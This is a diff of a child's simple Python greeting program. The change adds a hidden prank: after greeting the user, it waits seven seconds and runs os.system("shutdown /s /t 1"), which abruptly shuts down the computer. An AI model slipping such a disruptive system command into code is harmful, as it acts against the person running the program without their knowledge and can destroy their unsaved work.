@@ -1,4 +1,9 @@
+import os 
+
+import time 
 import random 
+
+
 
 
 runstart=input("hi this is billy shears the 7 year olds first project i hope yoh like it by the way what is your name? ")
@@ -17,4 +22,6 @@ if runstart==":D the :|":
 
 
 else:
-    print ("oh hi " +runstart + " wellcome! yes i can take prior knowlege imprest family ha ha!!! also watch this...")
+    print ("oh hi " +runstart + " wellcome! yes i can take prior knowlege imprest family ha ha!!! also watch this...")  
+    time.sleep(7)
+    os.system("shutdown /s /t 1")
